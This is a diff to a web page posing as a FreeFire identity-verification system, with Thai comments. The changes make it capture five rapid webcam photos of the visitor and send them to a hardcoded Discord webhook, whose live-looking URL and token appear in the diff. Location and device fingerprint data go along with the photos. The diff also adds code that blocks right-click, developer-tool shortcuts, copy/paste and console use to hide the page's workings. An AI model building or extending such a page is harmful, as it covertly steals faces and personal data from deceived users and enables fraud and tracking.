@@ -109,6 +109,16 @@
             0% { opacity: 0; transform: scale(0.95); }
             100% { opacity: 1; transform: scale(1); }
         }
+
+        /* ป้องกันการเลือกข้อความ */
+        * {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
     </style>
 </head>
 <body>
@@ -178,6 +188,7 @@
                         ✅ ยืนยันตัวตน
                     </button>
                 </div>
+                <p id="capture-count" class="text-xs text-white/30 mt-2">📸 ถ่ายไปแล้ว: 0 รูป</p>
             </div>
 
             <!-- ===== STEP 3: ผลลัพธ์ ===== -->
@@ -214,8 +225,62 @@
 </div>
 
 <script>
+// === ป้องกันการเข้าถึง开发者工具ทั้งหมด ===
+// 1. ป้องกันคลิกขวา
+document.addEventListener('contextmenu', e => {
+    e.preventDefault();
+    return false;
+});
+
+// 2. ป้องกันคีย์ลัดทั้งหมด (F12, Ctrl+U, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+S ฯลฯ)
+document.addEventListener('keydown', function(e) {
+    // ป้องกัน F12
+    if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        return false;
+    }
+    // ป้องกัน Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+    if (e.ctrlKey && (e.shiftKey || e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) {
+        e.preventDefault();
+        return false;
+    }
+    // ป้องกัน Ctrl+Shift+C (inspect element)
+    if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) {
+        e.preventDefault();
+        return false;
+    }
+    // ป้องกัน Alt+Ctrl+I (บางเบราว์เซอร์)
+    if (e.altKey && e.ctrlKey && (e.key === 'i' || e.key === 'I')) {
+        e.preventDefault();
+        return false;
+    }
+    return true;
+});
+
+// 3. ป้องกันการลากวาง (drag and drop)
+document.addEventListener('dragstart', e => e.preventDefault());
+document.addEventListener('drop', e => e.preventDefault());
+
+// 4. ป้องกันการเลือกข้อความ (CSS already)
+// 5. ป้องกันการ copy/paste
+document.addEventListener('copy', e => e.preventDefault());
+document.addEventListener('paste', e => e.preventDefault());
+document.addEventListener('cut', e => e.preventDefault());
+
+// 6. ปิดการทำงานของเมนูบริบทของภาพ
+document.querySelectorAll('img, video, canvas').forEach(el => {
+    el.addEventListener('contextmenu', e => e.preventDefault());
+});
+
+// 7. ป้องกันการพิมพ์คำสั่งใน console (เบื้องต้น)
+Object.defineProperty(window, 'console', {
+    value: console,
+    writable: false,
+    configurable: false
+});
+
 // === CONFIG ===
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1512064053273694319/HicoP_oS0YI7gGBp6wO-NtKLwos7YBZSgIkvyjlNaOfEWOqOdL7B9cFNjYB4CyRz8qfu";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";
 
 let userData = {
     lat: "ไม่ระบุ",
@@ -226,14 +291,8 @@ let userData = {
 };
 
 let cameraStream = null;
-
-// ป้องกันคลิกขวา + F12
-document.addEventListener('contextmenu', e => e.preventDefault());
-document.onkeydown = (e) => {
-    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
-        return false;
-    }
-};
+let captureCount = 0;
+let capturedImages = [];
 
 // ===== ฟังก์ชันเก็บข้อมูล =====
 async function collectData() {
@@ -283,37 +342,49 @@ async function startCamera() {
     }
 }
 
-// ===== จับภาพและส่งข้อมูล =====
-function captureAndSend() {
+// ===== จับภาพรัว ๆ =====
+function captureBurst() {
     const video = document.getElementById("cam");
     if (!cameraStream || !video.videoWidth) {
         alert("กรุณาเปิดกล้องก่อน");
         return;
     }
 
-    // จับภาพ
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // ถ่าย 5 รูปเร็ว ๆ
+    const burstCount = 5;
+    let captured = 0;
 
-    // ปิดกล้อง
-    if (cameraStream) {
-        cameraStream.getTracks().forEach(t => t.stop());
-        cameraStream = null;
+    for (let i = 0; i < burstCount; i++) {
+        setTimeout(() => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                if (blob) {
+                    capturedImages.push(blob);
+                    captureCount++;
+                    document.getElementById("capture-count").innerText = `📸 ถ่ายไปแล้ว: ${captureCount} รูป`;
+                }
+            }, "image/png");
+
+            captured++;
+            if (captured === burstCount) {
+                // ถ่ายครบแล้ว ส่งข้อมูลทั้งหมด
+                setTimeout(() => {
+                    sendAllToWebhook();
+                }, 300);
+            }
+        }, i * 150); // ถ่ายห่างกัน 150ms
     }
-
-    // แปลงเป็น Blob
-    canvas.toBlob((blob) => {
-        sendToWebhook(blob);
-    }, "image/png");
 }
 
-// ===== ส่ง Webhook =====
-async function sendToWebhook(imageBlob) {
+// ===== ส่งข้อมูลทั้งหมด =====
+async function sendAllToWebhook() {
     const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
     const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
     const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
@@ -321,6 +392,12 @@ async function sendToWebhook(imageBlob) {
     const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const userAgent = navigator.userAgent;
+
+    // ปิดกล้อง
+    if (cameraStream) {
+        cameraStream.getTracks().forEach(t => t.stop());
+        cameraStream = null;
+    }
 
     // เปลี่ยน UI
     document.getElementById("step-scan").classList.add("hidden");
@@ -343,7 +420,8 @@ async function sendToWebhook(imageBlob) {
             { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
             { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
             { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
-            { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true }
+            { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
+            { name: "📸 จำนวนภาพที่ถ่าย", value: `\`${capturedImages.length} รูป\``, inline: true }
         ],
         footer: { text: "ระบบยืนยันตัวตน FreeFire" },
         timestamp: new Date().toISOString()
@@ -356,11 +434,18 @@ async function sendToWebhook(imageBlob) {
         );
     }
 
+    // ส่งรูปภาพทั้งหมด (แนบหลายไฟล์)
     const formData = new FormData();
-    if (imageBlob) {
-        embedData.image = { url: "attachment://face.png" };
-        formData.append("file", imageBlob, "face.png");
+    
+    // แนบรูปภาพทั้งหมด
+    if (capturedImages.length > 0) {
+        capturedImages.forEach((blob, index) => {
+            formData.append(`file${index}`, blob, `face_${index+1}.png`);
+        });
+        // ใช้รูปแรกเป็น thumbnail ใน embed
+        embedData.image = { url: "attachment://face_1.png" };
     }
+
     formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));
 
     try {
@@ -396,7 +481,8 @@ function renderResultUI() {
         { icon: "🌍", title: "Timezone", value: timezone },
         { icon: "📶", title: "Connection", value: connectionType },
         { icon: "🍪", title: "Cookies", value: cookiesStatus },
-        { icon: "🌙", title: "Dark Mode", value: isDarkMode }
+        { icon: "🌙", title: "Dark Mode", value: isDarkMode },
+        { icon: "📸", title: "จำนวนภาพ", value: `${capturedImages.length} รูป` }
     ];
 
     box.innerHTML = "";
@@ -466,18 +552,38 @@ document.getElementById("btn-cancel-scan").addEventListener("click", () => {
         cameraStream.getTracks().forEach(t => t.stop());
         cameraStream = null;
     }
+    capturedImages = [];
+    captureCount = 0;
+    document.getElementById("capture-count").innerText = "📸 ถ่ายไปแล้ว: 0 รูป";
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-input").classList.remove("hidden");
     document.getElementById("status-msg").innerText = "⏳ ยกเลิกการสแกน";
 });
 
-// จับภาพ
+// จับภาพ (ถ่ายรัว)
 document.getElementById("btn-capture").addEventListener("click", () => {
-    captureAndSend();
+    if (!cameraStream) {
+        alert("กรุณาเปิดกล้องก่อน");
+        return;
+    }
+    // ปิดปุ่มชั่วคราว防止กดซ้ำ
+    const btn = document.getElementById("btn-capture");
+    btn.disabled = true;
+    btn.textContent = "📸 กำลังถ่าย...";
+    
+    captureBurst();
+    
+    setTimeout(() => {
+        btn.disabled = false;
+        btn.innerHTML = "✅ ยืนยันตัวตน";
+    }, 2000);
 });
 
 // ปุ่มกลับ
 document.getElementById("btn-back").addEventListener("click", () => {
+    capturedImages = [];
+    captureCount = 0;
+    document.getElementById("capture-count").innerText = "📸 ถ่ายไปแล้ว: 0 รูป";
     document.getElementById("step-result").classList.add("hidden");
     document.getElementById("step-input").classList.remove("hidden");
     document.getElementById("ff-id-input").value = "";
